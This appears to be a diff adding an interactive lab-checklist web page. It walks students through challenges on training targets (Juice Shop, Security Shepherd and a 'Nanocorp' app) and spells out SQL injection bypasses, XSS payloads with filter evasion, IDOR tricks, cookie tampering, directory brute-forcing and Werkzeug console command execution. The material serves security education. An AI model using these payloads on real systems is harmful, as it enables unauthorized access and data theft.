+      id:'js8', title:'JS-08 — Exposed Metrics Endpoint (★)', tag:'expo', stars:'★',
+      checks:[
+        'Navigated to /metrics',
+        'Prometheus metrics text visible',
+        'Green toast: "challenge solved — Exposed Metrics"',
+        'Screenshot: metrics output + URL bar',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/metrics' },
+        { label:'EXPECTED — raw Prometheus metrics text', type:'out',
+          text:'# HELP process_cpu_user_seconds_total ...\n# TYPE process_cpu_user_seconds_total counter\n<span class="hl">process_cpu_user_seconds_total 4.312</span>\n# HELP process_cpu_system_seconds_total ...\n...\nnodejs_version_info{version="v14.x",...} 1\n\n<span class="hl">✔  challenge solved — Exposed Metrics</span>' },
+      ]
+    },
+
+    {
+      id:'js9', title:'JS-09 — View Another User\'s Basket (★★)', tag:'idor', stars:'★★',
+      checks:[
+        'Logged in as your own USN account',
+        'Navigated to /rest/basket/1 in browser',
+        'Admin basket contents visible in JSON response',
+        'Green toast: "challenge solved — View Basket"',
+        'Screenshot: JSON response + URL bar',
+      ],
+      steps:[
+        { label:'MAKE SURE YOU ARE LOGGED IN AS YOUR USN (not admin)', type:'cmd',
+          text:'<span class="comment"># Log out, then log in as your USN email</span>\n<span class="comment"># Then navigate to:</span>\nhttp://192.168.20.[JUICE_IP]:3000/rest/basket/1\n<span class="comment"># ↑ basket ID 1 = admin\'s basket</span>' },
+        { label:'EXPECTED — JSON response', type:'out',
+          text:'{\n  "status": "success",\n  "data": {\n    "id": 1,\n    <span class="hl">"UserId": 1,</span>\n    "Products": [\n      { "name": "Apple Juice", "price": 1.99 },\n      ...\n    ]\n  }\n}\n\n<span class="hl">✔  challenge solved — View Basket</span>' },
+        { label:'IF YOU GET 401 UNAUTHORIZED', type:'fix',
+          text:'<b>You need to be logged in as a different user (not admin) to trigger this IDOR.</b> Log out of admin, log in as your USN account, then try /rest/basket/1 again.' },
+      ]
+    },
+
+    {
+      id:'js10', title:'JS-10 — Reflected XSS via Error Page (★)', tag:'xss', stars:'★',
+      checks:[
+        'Navigated to a URL with an XSS payload in the path',
+        'Alert dialog fired',
+        'Green toast: "challenge solved — Reflected XSS"',
+        'Screenshot: alert + URL bar with payload visible',
+      ],
+      steps:[
+        { label:'NAVIGATE TO THIS URL', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/<span class="payload">&lt;iframe src="javascript:alert(`xss`)"&gt;</span>\n\n<span class="comment"># The invalid path triggers an error page which reflects the URL unsanitized</span>' },
+        { label:'ALTERNATIVE IF ABOVE DOESN\'T WORK', type:'cmd',
+          text:'<span class="comment"># Open DevTools → Console, paste:</span>\n<span class="payload">location.href = \'http://192.168.20.X:3000/&lt;iframe src="javascript:alert(`xss`)"&gt;\'</span>' },
+        { label:'EXPECTED', type:'out',
+          text:'Browser alert fires with "xss"\n<span class="hl">✔  challenge solved — Reflected XSS</span>' },
+      ]
+    },
+
+    {
+      id:'js11', title:'JS-11 — GDPR Data Erasure Request Bypass (★★★)', tag:'auth', stars:'★★★',
+      checks:[
+        'Logged in as the deleted user "chris.pike@juice-sh.op" via SQLi',
+        'The account exists but was "erased" — still in DB',
+        'Green toast: "challenge solved — GDPR Data Erasure"',
+        'Screenshot taken',
+      ],
+      steps:[
+        { label:'NAVIGATE TO LOGIN', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/login' },
+        { label:'USE THIS PAYLOAD IN EMAIL FIELD', type:'cmd',
+          text:'Email: <span class="payload">chris.pike@juice-sh.op\'--</span>\nPassword: abc\n\nClick: LOG IN' },
+        { label:'EXPECTED', type:'out',
+          text:'Logged in as: <span class="hl">chris.pike@juice-sh.op</span>\n\n<span class="hl">✔  challenge solved — GDPR Data Erasure</span>\n\nThis shows a "deleted" account still exists in the database — data erasure was not implemented properly.' },
+        { label:'IF THAT EMAIL DOESN\'T WORK', type:'fix',
+          text:'<b>Try these other erased accounts in the same format (email\'-- in email field):</b><br><code>jim@juice-sh.op\'--</code><br><code>bender@juice-sh.op\'--</code>' },
+      ]
+    },
+
+    {
+      id:'js12', title:'JS-12 — Zero-Star Review (★★)', tag:'misc', stars:'★★',
+      checks:[
+        'Went to Customer Feedback page',
+        'Entered a comment',
+        'Intercepted or modified the rating to 0 via DevTools',
+        'Submitted successfully',
+        'Green toast: "challenge solved — Zero Stars"',
+        'Screenshot taken',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/contact' },
+        { label:'FILL OUT FORM', type:'cmd',
+          text:'<span class="comment"># The star rating slider minimum shows 1 star normally</span>\n<span class="comment"># You need to submit a 0-star review</span>\n\n<span class="comment"># Method: Open DevTools (F12) → Elements tab</span>\n<span class="comment"># Find the star rating input — it will be an &lt;input type="range" min="1" max="5"&gt;</span>\n<span class="comment"># Double-click the min="1" attribute and change it to min="0"</span>\n<span class="comment"># Now drag the slider all the way left to 0</span>\n\nComment: <span class="hl">This is a zero star review</span>\nCaptcha: solve it (read the math question)\nClick: SUBMIT' },
+        { label:'ALTERNATIVE — Console method', type:'cmd',
+          text:'<span class="comment"># F12 → Console tab, paste:</span>\nangular.element(document.querySelector(\'mat-slider\')).componentInstance.value = 0' },
+        { label:'EXPECTED', type:'out',
+          text:'Review submitted successfully.\n<span class="hl">✔  challenge solved — Zero Stars</span>' },
+        { label:'IF SLIDER WON\'T GO TO 0', type:'fix',
+          text:'<b>Use Burp Suite / network interception:</b><br>Enable proxy → submit form with 1 star → intercept the POST /api/Feedbacks/ request → change <code>"rating":1</code> to <code>"rating":0</code> → forward.' },
+      ]
+    },
+
+    {
+      id:'js13', title:'JS-BONUS — Deprecated Interface (★)', tag:'expo', stars:'★',
+      checks:[
+        'Navigated to /#/privacy-policy',
+        'Green toast: "challenge solved — Privacy Policy"',
+        'Screenshot taken',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/privacy-policy' },
+        { label:'EXPECTED', type:'out',
+          text:'Privacy Policy page loads with legal text.\n<span class="hl">✔  challenge solved — Privacy Policy</span>  ← simple but counts' },
+      ]
+    },
+
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p4', badge:'SHEPHERD', badgeClass:'badge-shep',
+  title:'Security Shepherd — 4 Challenges',
+  meta:'Submit result keys to the scoreboard · check /scoreboard.jsp after each',
+  challenges:[
+
+    {
+      id:'ss1', title:'SS-01 — Cookie Tampering (Broken Session Management)', tag:'auth',
+      checks:[
+        'Logged into Security Shepherd',
+        'Opened the first challenge module',
+        'Opened DevTools → Storage → Cookies',
+        'Found cookie named "lessonComplete" with value "lessonNotComplete"',
+        'Double-clicked value and changed to "lessonComplete"',
+        'Pressed Enter — confirmed new value saved in DevTools',
+        'Clicked "Complete This Lesson" button',
+        'Result key appeared on page',
+        'Copied key and pasted into the Submit box at top of page',
+        '/scoreboard.jsp updated with points',
+        'Screenshot: result key on page + scoreboard with points + URL',
+      ],
+      steps:[
+        { label:'STEP 1 — navigate to Security Shepherd and open first challenge', type:'cmd',
+          text:'http://192.168.20.[SHEPHERD_IP]:8080\n<span class="comment"># Login → click the first available challenge module</span>' },
+        { label:'STEP 2 — open DevTools Storage', type:'cmd',
+          text:'Press <span class="hl">F12</span>\nClick: Storage tab (Firefox) or Application tab (Chrome)\nExpand: Cookies → http://192.168.20.[SHEPHERD_IP]:8080\n\n<span class="comment"># Find cookie named:</span> <span class="hl">lessonComplete</span>\n<span class="comment"># Its current value:</span>  <span class="warn">lessonNotComplete</span>' },
+        { label:'STEP 3 — modify the cookie', type:'cmd',
+          text:'Double-click the VALUE cell for the lessonComplete cookie.\nDelete: <span class="warn">lessonNotComplete</span>\nType:   <span class="hl">lessonComplete</span>\nPress:  ENTER\n\n<span class="comment"># Confirm the cell now shows the new value before proceeding</span>' },
+        { label:'STEP 4 — trigger lesson completion', type:'cmd',
+          text:'<span class="comment"># Back on the challenge page:</span>\nClick: <span class="hl">"Complete This Lesson"</span> button' },
+        { label:'EXPECTED — result key appears', type:'out',
+          text:'Result Key: <span class="hl">a7c5f8e2b1d94f3a8e6c29d17b3f0e52</span>\n             (long hex/alphanumeric string)\n\nCopy the entire key string.' },
+        { label:'STEP 5 — submit the key', type:'cmd',
+          text:'<span class="comment"># At the top of the page there is a text input labeled "Submit Key"</span>\nPaste the result key → Click SUBMIT\n\n<span class="comment"># Then check your score:</span>\nhttp://192.168.20.[SHEPHERD_IP]:8080/scoreboard.jsp' },
+        { label:'IF BUTTON DOES NOTHING', type:'fix',
+          text:'<b>Cookie did not save properly.</b> Set it via console:<br><code>document.cookie = \'lessonComplete=lessonComplete; path=/\'</code><br>Press Enter in console, then refresh the page, then click the button again.' },
+      ]
+    },
+
+    {
+      id:'ss2', title:'SS-02 — SQL Injection Module', tag:'sqli',
+      checks:[
+        'Opened the SQL Injection challenge module',
+        'Tried SQL injection payloads in the input field',
+        'Got database records returned on screen',
+        'Found the result key (on page or in Network tab)',
+        'Submitted key to scoreboard',
+        'Points increased on /scoreboard.jsp',
+        'Screenshot: injected output + result key + scoreboard',
+      ],
+      steps:[
+        { label:'NAVIGATE TO SQLI CHALLENGE', type:'cmd',
+          text:'<span class="comment"># After completing SS-01, click "Get Next Challenge"</span>\n<span class="comment"># OR browse the module list for a SQL Injection named challenge</span>' },
+        { label:'TRY THESE PAYLOADS IN ORDER', type:'cmd',
+          text:`<span class="comment"># In whatever input field the challenge shows, try these one by one:</span>\n\nPayload 1:  <span class="payload">' OR '1'='1</span>\nPayload 2:  <span class="payload">' OR 1=1--</span>\nPayload 3:  <span class="payload">admin'--</span>\nPayload 4:  <span class="payload">" OR 1=1--</span>   ← double quote variant\nPayload 5:  <span class="payload">1' OR '1'='1' --</span>` },
+        { label:'EXPECTED — database records appear', type:'out',
+          text:'User records from DB:\n<span class="hl">ID: 1  |  Username: admin  |  Email: admin@...\nID: 2  |  Username: user2  |  ...\n...</span>\n\nResult Key: <span class="hl">b3f9d2e1a8c7f4b0e2d6a1...</span>' },
+        { label:'IF KEY NOT VISIBLE ON PAGE — CHECK NETWORK TAB', type:'cmd',
+          text:'F12 → Network tab\nClick: XHR or Fetch filter\nSubmit the payload again\nClick the request that appeared → Response tab\n<span class="comment"># Look for "resultKey" or "key" in the raw JSON response</span>' },
+        { label:'IF NO DATA RETURNED', type:'fix',
+          text:'<b>Try double-quote version:</b> <code>" OR 1=1--</code><br>Some Shepherd modules use double-quoted SQL strings.<br><b>Also try adding a space before the payload:</b> <code> \' OR 1=1--</code>' },
+      ]
+    },
+
+    {
+      id:'ss3', title:'SS-03 — IDOR (Insecure Direct Object Reference)', tag:'idor',
+      checks:[
+        'Identified the URL parameter containing your user ID',
+        'Changed the parameter to access another user\'s data (try ID=1)',
+        'Another user\'s data visible on screen',
+        'Result key visible or retrievable',
+        'Submitted key',
+        'Screenshot: URL with modified ID + another user\'s data visible',
+      ],
+      steps:[
+        { label:'IDENTIFY THE VULNERABLE PARAMETER', type:'cmd',
+          text:'<span class="comment"># In the IDOR challenge module, look at the URL or page source</span>\n<span class="comment"># Common patterns:</span>\n?userId=<span class="warn">5</span>      ← your ID\n?accountId=<span class="warn">5</span>\n?id=<span class="warn">5</span>\n?user=<span class="warn">5</span>' },
+        { label:'MODIFY THE ID TO ACCESS OTHER ACCOUNTS', type:'cmd',
+          text:'<span class="comment"># Change your ID to 1 (admin) or 2, 3, etc.:</span>\n?userId=<span class="hl">1</span>\n?accountId=<span class="hl">1</span>\n\n<span class="comment"># Submit or press Enter to reload with new ID</span>' },
+        { label:'EXPECTED — other user\'s data visible', type:'out',
+          text:'Account Details:\n<span class="hl">Username: admin</span>\nEmail: admin@...\nPrivate Notes: ...\n\nResult Key: <span class="hl">c8e1a3f7d2b9...</span>' },
+        { label:'IF ID CHANGE IS IN A FORM (NOT URL)', type:'cmd',
+          text:'F12 → Network tab → XHR filter\nSubmit the form normally\nRight-click the request → "Edit and Resend"\nChange the userId value in the request body to 1\nSend the modified request\nCheck the response for other user data + key' },
+      ]
+    },
+
+    {
+      id:'ss4', title:'SS-04 — Cross-Site Scripting (XSS)', tag:'xss',
+      checks:[
+        'Identified an input field in the XSS challenge module',
+        'Tried XSS payloads',
+        'Alert dialog fired or reflected output shown',
+        'Result key retrieved',
+        'Submitted key',
+        'Screenshot: XSS firing + result key + scoreboard',
+      ],
+      steps:[
+        { label:'TRY THESE PAYLOADS IN ORDER', type:'cmd',
+          text:`<span class="comment"># In the input field provided by the challenge:</span>\n\nPayload 1:  <span class="payload">&lt;script&gt;alert(1)&lt;/script&gt;</span>\nPayload 2:  <span class="payload">&lt;img src=x onerror=alert(1)&gt;</span>\nPayload 3:  <span class="payload">&lt;svg onload=alert(1)&gt;</span>\nPayload 4:  <span class="payload">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>\nPayload 5:  <span class="payload">'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>` },
+        { label:'EXPECTED', type:'out',
+          text:'Alert dialog fires: <span class="hl">1</span>\nOR reflected output shows your payload unescaped.\n\nResult Key: <span class="hl">d1f4a8b2c7e3...</span>' },
+        { label:'IF PAYLOADS ARE FILTERED', type:'fix',
+          text:'<b>Try case variations:</b> <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code><br><b>Try attribute injection:</b> <code>" autofocus onfocus=alert(1) x="</code><br><b>Check the page HTML</b> (Ctrl+U) to see where your input appears — adjust the payload to break out of that context.' },
+      ]
+    },
+
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p5', badge:'NANOCORP', badgeClass:'badge-nano',
+  title:'Nanocorp Bites — Recon & Vulnerability Discovery',
+  meta:'No scoreboard — document every finding with screenshots',
+  challenges:[
+
+    {
+      id:'nc1', title:'NC-01 — robots.txt Enumeration', tag:'recon',
+      checks:[
+        'Navigated to /robots.txt on Nanocorp',
+        'Read all Disallow entries',
+        'Noted all hidden paths on paper',
+        'Visited EACH disallowed path in the browser',
+        'Screenshot of robots.txt with all entries visible + URL bar',
+        'Screenshot of each path visited (200 = finding, 403 = reportable)',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[NANOCORP_IP]:5000/robots.txt' },
+        { label:'EXPECTED — disallow entries are your recon targets', type:'out',
+          text:'User-agent: *\n<span class="hl">Disallow: /admin</span>\n<span class="hl">Disallow: /backup</span>\n<span class="hl">Disallow: /internal</span>\n<span class="hl">Disallow: /console</span>\n\n<span class="warn">← Visit EVERY path listed here</span>' },
+        { label:'VISIT EACH PATH', type:'cmd',
+          text:'http://192.168.20.[NANOCORP_IP]:5000/admin\nhttp://192.168.20.[NANOCORP_IP]:5000/backup\nhttp://192.168.20.[NANOCORP_IP]:5000/internal\nhttp://192.168.20.[NANOCORP_IP]:5000/console\n<span class="comment"># Screenshot each one — even 403s are findings</span>' },
+        { label:'HOW TO INTERPRET STATUS CODES', type:'out',
+          text:'<span class="hl">200 OK</span>     → Page exists and is accessible — HIGH FINDING\n<span class="warn">403 Forbidden</span> → Path exists but blocked — MEDIUM FINDING (path disclosure)\n<span class="err">404 Not Found</span> → Path does not exist — not a finding\n500 Error  → Server-side issue — potential finding' },
+        { label:'IF /robots.txt RETURNS 404', type:'fix',
+          text:'Try <code>/sitemap.xml</code> next. If also 404, proceed directly to gobuster (NC-02).' },
+      ]
+    },
+
+    {
+      id:'nc2', title:'NC-02 — Gobuster Directory Brute-Force', tag:'recon',
+      checks:[
+        'Ran gobuster against Nanocorp port 5000',
+        'Noted ALL results with status 200 or 301',
+        'Noted ALL results with status 403 (reportable even if blocked)',
+        'Visited every 200/301 result in browser',
+        'Screenshot of gobuster terminal output',
+        'Screenshot of each interesting page found',
+      ],
+      steps:[
+        { label:'COMMAND', type:'cmd',
+          text:'<span class="prompt">$</span> gobuster dir \\\n  -u http://192.168.20.[NANOCORP_IP]:5000 \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -t 20 \\\n  -x php,html,txt,py' },
+        { label:'EXPECTED OUTPUT — status codes to act on', type:'out',
+          text:'===============================================================\nGobuster v3.x\n===============================================================\n/admin        (Status: <span class="hl">200</span>)  [Size: 1234] ← visit immediately\n/login        (Status: <span class="hl">200</span>)  [Size: 2345]\n/console      (Status: <span class="hl">200</span>)  [Size: 567]  ← CRITICAL if Werkzeug\n/backup       (Status: <span class="warn">403</span>)  [Size: 89]   ← reportable finding\n/.git         (Status: <span class="hl">200</span>)  [Size: 234]  ← CRITICAL — source code\n/static       (Status: <span class="hl">301</span>)  [Size: 0]' },
+        { label:'IF WORDLIST NOT FOUND', type:'fix',
+          text:'<b>Try these alternatives in order:</b><br><code>/usr/share/wordlists/dirb/small.txt</code><br><code>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code><br><code>/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</code>' },
+        { label:'IF /.GIT IS FOUND', type:'info',
+          text:'<b>This is a critical finding!</b> Exposed .git means source code may be dumpable.<br>Navigate to <code>http://192.168.20.X:5000/.git/</code> — if listing is on, you can read the entire source code. Screenshot everything.' },
+      ]
+    },
+
+    {
+      id:'nc3', title:'NC-03 — Werkzeug Debug Console (RCE)', tag:'rce',
+      checks:[
+        'Navigated to /console on Nanocorp',
+        'Checked if it loaded an interactive Python prompt OR a PIN screen',
+        'If no PIN: ran test command in console',
+        'Screenshot of console — either interactive prompt or PIN request',
+        'If interactive: ran os.listdir(".") and screenshot the output',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[NANOCORP_IP]:5000/console' },
+        { label:'EXPECTED — SCENARIO A: fully open console (critical!)', type:'out',
+          text:'┌─────────────────────────────────────────────────────┐\n│  <span class="hl">Interactive Console</span>                                 │\n│  Werkzeug Debugger                                  │\n│                                                     │\n│  >>> _                                              │\n│                                                     │\n└─────────────────────────────────────────────────────┘\n\n<span class="hl">← This is Remote Code Execution. CRITICAL FINDING.</span>' },
+        { label:'IF CONSOLE IS OPEN — run these commands and screenshot each', type:'cmd',
+          text:'<span class="comment"># Type in the Werkzeug console (press Enter after each):</span>\nimport os; os.listdir(\'.\')\n<span class="comment"># Expected: [\'app.py\', \'templates\', \'static\', ...]</span>\n\nimport os; os.popen(\'id\').read()\n<span class="comment"># Expected: uid=0(root) gid=0(root)... or similar</span>\n\nimport os; os.popen(\'hostname\').read()\n<span class="comment"># Expected: container hostname</span>' },
+        { label:'EXPECTED COMMAND OUTPUTS', type:'out',
+          text:`<span class="comment"># os.listdir('.'):</span>\n<span class="hl">['app.py', 'templates', 'static', 'requirements.txt', 'config.py']</span>\n\n<span class="comment"># os.popen('id').read():</span>\n<span class="hl">uid=0(root) gid=0(root) groups=0(root)</span>\n\n<span class="comment"># os.popen('hostname').read():</span>\n<span class="hl">nanocorp-bites-container</span>` },
+        { label:'EXPECTED — SCENARIO B: PIN prompt (still a finding)', type:'out',
+          text:'<span class="warn">This console is locked.\nPlease enter your PIN to unlock it.</span>\n\nPIN: [____]\n\n<span class="warn">← Still a reportable finding: the debug endpoint is exposed.</span>\nScreenshot this PIN prompt — it proves the /console route exists.' },
+        { label:'IF /console RETURNS 404', type:'fix',
+          text:'Not all Nanocorp builds have /console. Document this as "Werkzeug console endpoint not found on this build." Then proceed to NC-04.' },
+      ]
+    },
+
+    {
+      id:'nc4', title:'NC-04 — Hardcoded Credentials in Page Source', tag:'expo',
+      checks:[
+        'Opened Nanocorp main page in Firefox',
+        'Pressed Ctrl+U to view page source',
+        'Searched for: password, api_key, token, secret, <!--',
+        'Found at least one hardcoded value (or confirmed none)',
+        'Checked JavaScript files in DevTools → Sources tab',
+        'Screenshot of any hardcoded value found with the URL visible',
+      ],
+      steps:[
+        { label:'VIEW PAGE SOURCE ON EACH PAGE', type:'cmd',
+          text:'<span class="comment"># On each Nanocorp page (main, /login, /admin, /internal):</span>\nPress <span class="hl">Ctrl+U</span>  (opens raw HTML source in new tab)\n\n<span class="comment"># Search within the source:</span>\nPress <span class="hl">Ctrl+F</span> and search for each of these terms:\n  password\n  api_key\n  token\n  secret\n  apikey\n  key=\n  &lt;!--          ← HTML comments often hide credentials' },
+        { label:'ALSO CHECK JAVASCRIPT FILES', type:'cmd',
+          text:'<span class="comment"># Press F12 → Debugger tab (Firefox) OR Sources tab (Chrome)</span>\n<span class="comment"># Expand the domain on the left panel</span>\n<span class="comment"># Click each .js file → Ctrl+F inside the code viewer</span>\n<span class="comment"># Search for same terms: password, token, key, secret</span>' },
+        { label:'FINDING LOOKS LIKE THIS', type:'out',
+          text:'<span class="comment">&lt;!-- admin password: <span class="hl">supersecret123</span> --&gt;</span>\n\n<span class="dim">or in a .js file:</span>\n\n<span class="hl">const API_KEY = \'sk-abc123def456...\';</span>\n\n<span class="dim">or:</span>\n\n<span class="hl">var DB_PASSWORD = \'nanocorp2024\';</span>' },
+        { label:'IF NOTHING FOUND IN SOURCE', type:'fix',
+          text:'<b>Check response headers too:</b><br>F12 → Network tab → reload the page → click the main document request → Headers tab<br>Look for: <code>X-Powered-By</code>, <code>Server</code>, <code>X-Debug-Token</code>, custom headers with credentials.<br><br>If still nothing, document "no hardcoded credentials found in page source or response headers" — negative findings matter in a report.' },
+      ]
+    },
+
+    {
+      id:'nc5', title:'NC-05 — Login Page: SQL Injection & Default Credentials', tag:'sqli',
+      checks:[
+        'Found the /login page on Nanocorp',
+        'Tried SQL injection payloads in username field',
+        'Tried default credentials: admin/admin, admin/password, nanocorp/nanocorp',
+        'Noted what happened — success, error message, or redirect',
+        'Screenshot of each attempt and result',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[NANOCORP_IP]:5000/login' },
+        { label:'TRY SQL INJECTION', type:'cmd',
+          text:`Username: <span class="payload">' OR 1=1-- </span>    Password: anything\nUsername: <span class="payload">admin'--</span>      Password: anything\nUsername: <span class="payload">" OR "1"="1</span>  Password: anything` },
+        { label:'TRY DEFAULT CREDENTIALS', type:'cmd',
+          text:`Username: <span class="hl">admin</span>      Password: <span class="hl">admin</span>\nUsername: <span class="hl">admin</span>      Password: <span class="hl">password</span>\nUsername: <span class="hl">admin</span>      Password: <span class="hl">nanocorp</span>\nUsername: <span class="hl">admin</span>      Password: <span class="hl">admin123</span>\nUsername: <span class="hl">nanocorp</span>   Password: <span class="hl">nanocorp</span>` },
+        { label:'EXPECTED — SQLi success', type:'out',
+          text:'Redirected to /dashboard or /admin\nPage title changes: <span class="hl">Welcome, Admin</span>  ← authentication bypass confirmed' },
+        { label:'INTERESTING ERROR MESSAGES ARE ALSO FINDINGS', type:'out',
+          text:'<span class="warn">Error: You have an error in your SQL syntax near \'...\' at line 1</span>\n← This is a SQLi finding even without successful login\n   Document the error message + screenshot' },
+      ]
+    },
+
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p6', badge:'WRAP-UP', badgeClass:'badge-wrap',
+  title:'Final Screenshots & Submission',
+  meta:'Do this before time is up — scores don\'t count without screenshots',
+  challenges:[
+    {
+      id:'w1', title:'Final scoreboard screenshots', tag:'misc',
+      checks:[
+        'Juice Shop /#/score-board — USN visible top-right — URL bar visible — screenshot',
+        'Juice Shop score-board — all solved cards are green — screenshot',
+        'Security Shepherd /scoreboard.jsp — USN and points visible — URL bar — screenshot',
+        'Each individual Juice Shop finding — screenshot exists with URL + toast',
+        'Each Nanocorp finding — screenshot exists with URL',
+        'All screenshots transferred to your submission folder',
+      ],
+      steps:[
+        { label:'JUICE SHOP FINAL SCREENSHOT', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/score-board\n<span class="comment"># Make sure: USN email visible top-right + URL bar + green solved cards</span>\n<span class="comment"># Press Ctrl+- once to zoom out so all cards fit on screen</span>\nPress: <span class="hl">PrtSc</span>  or use the screenshot tool' },
+        { label:'SECURITY SHEPHERD FINAL SCREENSHOT', type:'cmd',
+          text:'http://192.168.20.[SHEPHERD_IP]:8080/scoreboard.jsp\n<span class="comment"># Make sure: your USN username + total points visible + URL bar</span>' },
+        { label:'SCREENSHOT CHECKLIST FOR EVERY FINDING', type:'out',
+          text:'✔  URL bar visible showing the target IP and path\n✔  The result is visible (alert box / solved card / data / error message)\n✔  Your USN is visible (for score-board screenshots)\n✔  Filename is descriptive: JS-03-sql-admin-login.png\n\n<span class="hl">Do NOT submit screenshots without the URL bar — they cannot be verified</span>' },
+        { label:'CRITICAL', type:'fix',
+          text:'<b>If you run out of time — take the scoreboards first.</b> A scoreboard screenshot with solved items proves more than individual finding screenshots. Scoreboards over findings if forced to choose.' },
+      ]
+    },
+  ]
+},
+
+];
+
+// ════════════════════════════════════════════════
+// STATE
+// ════════════════════════════════════════════════
+const state = {};
+let totalChecks = 0;
+
+function countTotal() {
+  let n = 0;
+  GUIDE.forEach(s => s.challenges.forEach(c => { if(c.checks) n += c.checks.length; }));
+  return n;
+}
+function countDone() {
+  return Object.values(state).filter(Boolean).length;
+}
+function updateProgress() {
+  const done = countDone();
+  const total = totalChecks;
+  document.getElementById('prog-text').textContent = done + ' / ' + total + ' done';
+  document.getElementById('prog-fill').style.width = total ? (done/total*100)+'%' : '0%';
+}
+
+// ════════════════════════════════════════════════
+// RENDER
+// ════════════════════════════════════════════════
+function renderContent(steps) {
+  return steps.map(step => {
+    if(step.type === 'cmd') {
+      const plain = step.text.replace(/<[^>]+>/g,'');
+      const id = 'cb'+Math.random().toString(36).slice(2,8);
+      return `<p class="block-label">${step.label||'COMMAND'}</p>
+<div class="cmd-block" id="${id}">
+  <button class="copy-btn" onclick="doCopy('${id}',this,'${plain.replace(/'/g,"\\'")}')">copy</button>
+  <span class="prompt">$ </span>${step.text}
+</div>`;
+    }
+    if(step.type === 'out') {
+      return `<p class="block-label">${step.label||'EXPECTED OUTPUT'}</p>
+<div class="out-block">${step.text}</div>`;
+    }
+    if(step.type === 'fix') {
+      return `<p class="block-label">⚠ IF SOMETHING GOES WRONG</p>
+<div class="fix-block">${step.text}</div>`;
+    }
+    if(step.type === 'info') {
+      return `<p class="block-label">ℹ TIP / BONUS</p>
+<div class="info-block">${step.text}</div>`;
+    }
+    if(step.type === 'critical') {
+      return `<p class="block-label">🚨 CRITICAL</p>
+<div class="critical-block">${step.text}</div>`;
+    }
+    return '';
+  }).join('');
+}
+
+function renderChecklist(challenge) {
+  if(!challenge.checks) return '';
+  return challenge.checks.map((c,i) => {
+    const key = challenge.id+'_'+i;
+    const done = !!state[key];
+    return `<div class="check-row" onclick="toggle('${key}',this)">
+      <div class="check-box${done?' checked':''}">${done?'✓':''}</div>
+      <div class="check-label${done?' done':''}">${c}</div>
+    </div>`;
+  }).join('');
+}
+
+function renderChallenge(ch) {
+  const tagMap = {
+    sqli:'tag-sqli',xss:'tag-xss',idor:'tag-idor',expo:'tag-expo',
+    auth:'tag-auth',misc:'tag-misc',rce:'tag-rce',brute:'tag-brute',recon:'tag-recon'
+  };
+  const tagLabels = {
+    sqli:'SQL Injection',xss:'XSS',idor:'IDOR',expo:'Data Exposure',
+    auth:'Auth',misc:'Misc',rce:'RCE',brute:'Brute Force',recon:'Recon'
+  };
+  return `
+<div class="challenge" id="ch_${ch.id}">
+  <div class="challenge-header" onclick="toggleCh('${ch.id}')">
+    <div class="ch-index" id="idx_${ch.id}">→</div>
+    <div class="ch-title">${ch.title}</div>
+    ${ch.stars ? `<span class="ch-stars">${ch.stars}</span>` : ''}
+    ${ch.tag ? `<span class="ch-tag ${tagMap[ch.tag]||'tag-misc'}">${tagLabels[ch.tag]||ch.tag}</span>` : ''}
+    <span class="ch-chevron open" id="chev_${ch.id}">▶</span>
+  </div>
+  <div class="challenge-body open" id="body_${ch.id}">
+    ${ch.checks ? `<p class="block-label">CHECKLIST — tick as you go</p>
+<div class="checklist">${renderChecklist(ch)}</div>` : ''}
+    ${ch.steps ? renderContent(ch.steps) : ''}
+  </div>
+</div>`;
+}
+
+function renderSection(sec) {
+  return `
+<div class="section" id="sec_${sec.id}">
+  <div class="section-header" onclick="toggleSec('${sec.id}')">
+    <span class="section-badge ${sec.badgeClass}">${sec.badge}</span>
+    <span class="section-title">${sec.title}</span>
+    <span class="section-meta">${sec.meta||''}</span>
+    <span class="section-chevron open" id="schev_${sec.id}">▶</span>
+  </div>
+  <div class="section-body open" id="sbody_${sec.id}">
+    ${sec.challenges.map(renderChallenge).join('')}
+  </div>
+</div>`;
+}
+
+function render() {
+  totalChecks = countTotal();
+  document.getElementById('app').innerHTML = GUIDE.map(renderSection).join('');
+  updateProgress();
+}
+
+// ════════════════════════════════════════════════
+// INTERACTIONS
+// ════════════════════════════════════════════════
+function toggle(key, row) {
+  state[key] = !state[key];
+  const box = row.querySelector('.check-box');
+  const label = row.querySelector('.check-label');
+  box.classList.toggle('checked', !!state[key]);
+  box.textContent = state[key] ? '✓' : '';
+  label.classList.toggle('done', !!state[key]);
+  updateProgress();
+}
+
+function toggleSec(id) {
+  const body = document.getElementById('sbody_'+id);
+  const chev = document.getElementById('schev_'+id);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+}
+
+function toggleCh(id) {
+  const body = document.getElementById('body_'+id);
+  const chev = document.getElementById('chev_'+id);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+}
+
+function doCopy(blockId, btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+
+render();
+</script>
+</body>
+</html>
